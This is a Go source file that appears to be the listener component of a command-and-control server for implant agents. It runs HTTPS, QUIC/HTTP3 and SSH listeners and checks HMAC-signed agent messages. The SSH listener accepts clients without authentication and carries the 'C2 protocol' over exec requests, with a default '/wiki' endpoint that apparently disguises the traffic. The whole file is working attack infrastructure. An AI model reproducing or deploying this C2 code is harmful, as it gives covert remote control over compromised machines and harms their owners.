package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"sync"
	"time"

	gorillaHandlers "github.com/gorilla/handlers"
	"github.com/gorilla/mux"
	"github.com/quic-go/quic-go/http3"
	"golang.org/x/crypto/ssh"
)

// listenerServer is a generic interface for stoppable listener servers
type listenerServer interface {
	Stop() error
}

var (
	listenerServers    = make(map[string]listenerServer)
	listenerServersMux sync.Mutex
)

// startAgentListenerServer starts the appropriate server based on listener type
func startAgentListenerServer(listener *Listener) error {
	protocol := listenerProtocol(listener.Type)
	switch protocol {
	case "https":
		return startHTTPSListenerServer(listener)
	case "quic":
		return startQUICListenerServer(listener)
	case "ssh":
		return startSSHListenerServer(listener)
	default:
		return fmt.Errorf("unsupported protocol for listener type: %s", listener.Type)
	}
}

// stopAgentListenerServer stops a running listener server
func stopAgentListenerServer(listenerID string) {
	listenerServersMux.Lock()
	defer listenerServersMux.Unlock()

	server, exists := listenerServers[listenerID]
	if !exists {
		return
	}

	if err := server.Stop(); err != nil {
		log.Printf("Error stopping listener server %s: %v", listenerID, err)
	}

	delete(listenerServers, listenerID)
	log.Printf("Stopped listener server: %s", listenerID)
}

// ============================================================
// HTTPS Listener (phantasm, anomaly)
// ============================================================

type httpsListenerServer struct {
	server *http.Server
}

func (h *httpsListenerServer) Stop() error {
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	return h.server.Shutdown(ctx)
}

func startHTTPSListenerServer(listener *Listener) error {
	listenerServersMux.Lock()
	defer listenerServersMux.Unlock()

	if _, exists := listenerServers[listener.ID]; exists {
		return fmt.Errorf("server already running for listener %s", listener.ID)
	}

	router := mux.NewRouter()
	router.HandleFunc("/{path:.*}", agentHmacMiddleware(handleDirectAgentRequest)).Methods("POST")

	corsHandler := gorillaHandlers.CORS(
		gorillaHandlers.AllowedOrigins([]string{"*"}),
		gorillaHandlers.AllowedMethods([]string{"POST", "OPTIONS"}),
		gorillaHandlers.AllowedHeaders([]string{"Content-Type"}),
	)(router)

	tlsConfig := &tls.Config{
		MinVersion: tls.VersionTLS12,
	}

	addr := fmt.Sprintf("0.0.0.0:%d", listener.Port)
	server := &http.Server{
		Addr:      addr,
		Handler:   corsHandler,
		TLSConfig: tlsConfig,
	}

	startErr := make(chan error, 1)
	go func() {
		log.Printf("HTTPS listener '%s' (%s) starting on %s", listener.Name, listener.Type, addr)
		if err := server.ListenAndServeTLS("server.crt", "server.key"); err != nil && err != http.ErrServerClosed {
			log.Printf("HTTPS listener '%s' failed: %v", listener.Name, err)
			startErr <- err
		}
	}()

	select {
	case err := <-startErr:
		return fmt.Errorf("HTTPS listener failed to start on port %d: %v", listener.Port, err)
	case <-time.After(500 * time.Millisecond):
	}

	listenerServers[listener.ID] = &httpsListenerServer{server: server}
	log.Printf("HTTPS listener '%s' (%s) is now listening on %s", listener.Name, listener.Type, addr)
	return nil
}

// ============================================================
// QUIC/HTTP3 Listener (geist, wraith)
// ============================================================

type quicListenerServer struct {
	server *http3.Server
}

func (q *quicListenerServer) Stop() error {
	if q.server != nil {
		return q.server.Close()
	}
	return nil
}

func startQUICListenerServer(listener *Listener) error {
	listenerServersMux.Lock()
	defer listenerServersMux.Unlock()

	if _, exists := listenerServers[listener.ID]; exists {
		return fmt.Errorf("server already running for listener %s", listener.ID)
	}

	muxHandler := http.NewServeMux()

	// Catch-all handler: read body, validate agent HMAC, process request
	muxHandler.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
			return
		}
		// Use the same agent HMAC middleware logic
		agentHmacMiddleware(handleDirectAgentRequest)(w, r)
	})

	// Load TLS cert for QUIC
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		return fmt.Errorf("failed to load TLS cert for QUIC: %v", err)
	}

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		MinVersion:   tls.VersionTLS12,
	}

	addr := fmt.Sprintf("0.0.0.0:%d", listener.Port)
	h3Server := &http3.Server{
		Addr:      addr,
		Handler:   muxHandler,
		TLSConfig: tlsConfig,
	}

	startErr := make(chan error, 1)
	go func() {
		log.Printf("QUIC listener '%s' (%s) starting on %s", listener.Name, listener.Type, addr)
		if err := h3Server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Printf("QUIC listener '%s' failed: %v", listener.Name, err)
			startErr <- err
		}
	}()

	select {
	case err := <-startErr:
		return fmt.Errorf("QUIC listener failed to start on port %d: %v", listener.Port, err)
	case <-time.After(500 * time.Millisecond):
	}

	listenerServers[listener.ID] = &quicListenerServer{server: h3Server}
	log.Printf("QUIC listener '%s' (%s) is now listening on %s", listener.Name, listener.Type, addr)
	return nil
}

// ============================================================
// SSH Listener (shade)
// ============================================================

type sshListenerServer struct {
	listener net.Listener
	cancel   context.CancelFunc
}

func (s *sshListenerServer) Stop() error {
	s.cancel()
	if s.listener != nil {
		return s.listener.Close()
	}
	return nil
}

func startSSHListenerServer(listener *Listener) error {
	listenerServersMux.Lock()
	defer listenerServersMux.Unlock()

	if _, exists := listenerServers[listener.ID]; exists {
		return fmt.Errorf("server already running for listener %s", listener.ID)
	}

	// Generate ephemeral SSH host key
	hostKey, err := generateSSHHostKey()
	if err != nil {
		return fmt.Errorf("failed to generate SSH host key: %v", err)
	}

	sshConfig := &ssh.ServerConfig{
		NoClientAuth: true,
	}
	sshConfig.AddHostKey(hostKey)

	addr := fmt.Sprintf("0.0.0.0:%d", listener.Port)
	tcpListener, err := net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("SSH listener failed to bind port %d: %v", listener.Port, err)
	}

	ctx, cancel := context.WithCancel(context.Background())

	go func() {
		log.Printf("SSH listener '%s' (%s) starting on %s", listener.Name, listener.Type, addr)
		acceptSSHConnections(ctx, tcpListener, sshConfig)
	}()

	listenerServers[listener.ID] = &sshListenerServer{
		listener: tcpListener,
		cancel:   cancel,
	}
	log.Printf("SSH listener '%s' (%s) is now listening on %s", listener.Name, listener.Type, addr)
	return nil
}

// acceptSSHConnections accepts SSH connections in a loop
func acceptSSHConnections(ctx context.Context, listener net.Listener, config *ssh.ServerConfig) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
			conn, err := listener.Accept()
			if err != nil {
				if ctx.Err() != nil {
					return
				}
				log.Printf("[ssh] Accept error: %v", err)
				continue
			}
			go handleSSHConnection(ctx, conn, config)
		}
	}
}

// handleSSHConnection handles a single SSH connection
func handleSSHConnection(ctx context.Context, conn net.Conn, config *ssh.ServerConfig) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(5 * time.Minute))

	go func() {
		<-ctx.Done()
		conn.Close()
	}()

	sshConn, chans, reqs, err := ssh.NewServerConn(conn, config)
	if err != nil {
		log.Printf("[ssh] Handshake failed from %s: %v", conn.RemoteAddr(), err)
		return
	}
	defer sshConn.Close()

	log.Printf("[ssh] Connection from %s (user: %s)", conn.RemoteAddr(), sshConn.User())
	go ssh.DiscardRequests(reqs)

	for newChannel := range chans {
		select {
		case <-ctx.Done():
			return
		default:
		}

		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown channel type")
			continue
		}

		channel, requests, err := newChannel.Accept()
		if err != nil {
			log.Printf("[ssh] Channel accept error: %v", err)
			continue
		}

		go handleSSHSession(ctx, channel, requests)
	}
}

// handleSSHSession handles an SSH session channel
func handleSSHSession(ctx context.Context, channel ssh.Channel, requests <-chan *ssh.Request) {
	defer channel.Close()

	go func() {
		<-ctx.Done()
		channel.Close()
	}()

	for req := range requests {
		select {
		case <-ctx.Done():
			return
		default:
		}

		switch req.Type {
		case "exec":
			go handleSSHExecRequest(ctx, channel, req)
		default:
			if req.WantReply {
				req.Reply(false, nil)
			}
		}
	}
}

// handleSSHExecRequest handles "exec" requests — the C2 protocol over SSH
// The agent sends JSON via session stdin, we validate HMAC, process, and respond
func handleSSHExecRequest(ctx context.Context, channel ssh.Channel, req *ssh.Request) {
	if req.WantReply {
		req.Reply(true, nil)
	}

	// Read the full message from the SSH channel
	message, err := io.ReadAll(channel)
	if err != nil {
		log.Printf("[ssh] Failed to read message: %v", err)
		channel.Write([]byte(fmt.Sprintf(`{"error": "failed to read: %v"}`, err)))
		return
	}

	// The message is the same wrapper format agents use:
	// {"agent_type":"shade", "data":{...}, "timestamp":"...", "signature":"..."}
	// We need to validate HMAC and unwrap the data, then process
	var wrapper struct {
		Data      json.RawMessage `json:"data"`
		Timestamp string          `json:"timestamp"`
		Signature string          `json:"signature"`
		Endpoint  string          `json:"endpoint"`
	}
	if err := json.Unmarshal(message, &wrapper); err != nil {
		log.Printf("[ssh] Failed to parse message: %v", err)
		channel.Write([]byte(`{"error": "invalid JSON"}`))
		channel.Close()
		return
	}

	// Determine endpoint
	endpoint := wrapper.Endpoint
	if endpoint == "" {
		endpoint = "/wiki"
	}

	// Validate HMAC
	if wrapper.Timestamp == "" || wrapper.Signature == "" || len(wrapper.Data) == 0 {
		log.Printf("[ssh] Missing HMAC fields")
		channel.Write([]byte(`{"error": "missing authentication"}`))
		channel.Close()
		return
	}

	hmacMessage := fmt.Sprintf("POST%s%s%s", endpoint, wrapper.Timestamp, string(wrapper.Data))
	expectedSig := generateHMAC(hmacMessage, hmacKey)
	if expectedSig != wrapper.Signature {
		log.Printf("[ssh] HMAC validation failed")
		channel.Write([]byte(`{"error": "invalid HMAC"}`))
		channel.Close()
		return
	}

	// Create a fake HTTP request so we can reuse handleDirectAgentRequest
	body := io.NopCloser(bytes.NewReader(wrapper.Data))
	fakeReq, err := http.NewRequestWithContext(ctx, "POST", endpoint, body)
	if err != nil {
		log.Printf("[ssh] Failed to create request: %v", err)
		channel.Write([]byte(`{"error": "internal error"}`))
		channel.Close()
		return
	}
	fakeReq.Header.Set("Content-Type", "application/json")

	// Capture the response using a ResponseRecorder
	recorder := &responseCapture{headers: make(http.Header), body: &bytes.Buffer{}}
	handleDirectAgentRequest(recorder, fakeReq)

	// Send response back through SSH channel
	channel.Write(recorder.body.Bytes())
	channel.Close()
}

// responseCapture captures HTTP response for SSH forwarding
type responseCapture struct {
	headers    http.Header
	body       *bytes.Buffer
	statusCode int
}

func (r *responseCapture) Header() http.Header         { return r.headers }
func (r *responseCapture) WriteHeader(statusCode int)   { r.statusCode = statusCode }
func (r *responseCapture) Write(b []byte) (int, error)  { return r.body.Write(b) }

// ============================================================
// SSH Host Key Generation
// ============================================================

func generateSSHHostKey() (ssh.Signer, error) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	privateKeyPEM := pem.EncodeToMemory(&pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: x509.MarshalPKCS1PrivateKey(privateKey),
	})

	signer, err := ssh.ParsePrivateKey(privateKeyPEM)
	if err != nil {
		return nil, err
	}

	return signer, nil
}

